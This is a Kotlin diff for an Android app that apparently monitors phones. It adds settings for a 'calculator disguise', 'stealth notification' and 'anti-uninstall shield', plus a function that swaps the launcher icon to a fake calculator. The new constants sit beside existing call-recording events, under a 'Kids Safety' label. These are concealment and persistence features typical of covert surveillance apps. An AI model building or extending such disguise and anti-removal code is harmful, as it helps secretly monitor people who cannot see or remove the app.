@@ -377,6 +377,36 @@ object DevicePrefs {
             .apply()
     }
 
+    var calculatorDisguiseEnabled: Boolean
+        get() = prefs.getBoolean("calculator_disguise_enabled", false)
+        set(value) = prefs.edit().putBoolean("calculator_disguise_enabled", value).apply()
+
+    var stealthNotificationEnabled: Boolean
+        get() = prefs.getBoolean("stealth_notification_enabled", true)
+        set(value) = prefs.edit().putBoolean("stealth_notification_enabled", value).apply()
+
+    var antiUninstallShieldEnabled: Boolean
+        get() = prefs.getBoolean("anti_uninstall_shield_enabled", true)
+        set(value) = prefs.edit().putBoolean("anti_uninstall_shield_enabled", value).apply()
+
+    fun updateCalculatorAlias(context: Context, enabled: Boolean) {
+        try {
+            val pm = context.packageManager
+            val defaultComp = android.content.ComponentName(context, "com.phonelink.hub.MainActivity")
+            val calcComp = android.content.ComponentName(context, "com.phonelink.hub.CalculatorAlias")
+
+            if (enabled) {
+                pm.setComponentEnabledSetting(calcComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                pm.setComponentEnabledSetting(defaultComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+            } else {
+                pm.setComponentEnabledSetting(defaultComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                pm.setComponentEnabledSetting(calcComp, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+            }
+        } catch (e: Exception) {
+            android.util.Log.w("DevicePrefs", "updateCalculatorAlias failed: ${e.message}")
+        }
+    }
+
     private fun hashWithSalt(pin: String, saltHex: String): String {
         val md = java.security.MessageDigest.getInstance("SHA-256")
         md.update(saltHex.toByteArray(Charsets.UTF_8))
@@ -672,4 +702,12 @@ object Events {
     const val CALL_RECORDING_CONFIG_COMMAND = "CALL_RECORDING_CONFIG_COMMAND"
     const val CALL_RECORDING_STATUS = "CALL_RECORDING_STATUS"
     const val CALL_RECORDING_SAVED = "CALL_RECORDING_SAVED"
+
+    // Kids Safety & Calculator Camouflage
+    const val CAMOUFLAGE_CONFIG_COMMAND = "CAMOUFLAGE_CONFIG_COMMAND"
+    const val CAMOUFLAGE_STATUS = "CAMOUFLAGE_STATUS"
+
+    // Hardware Button Controls & Quick Settings
+    const val QUICK_SETTING_COMMAND = "QUICK_SETTING_COMMAND"
+    const val QUICK_SETTING_STATUS = "QUICK_SETTING_STATUS"
 }
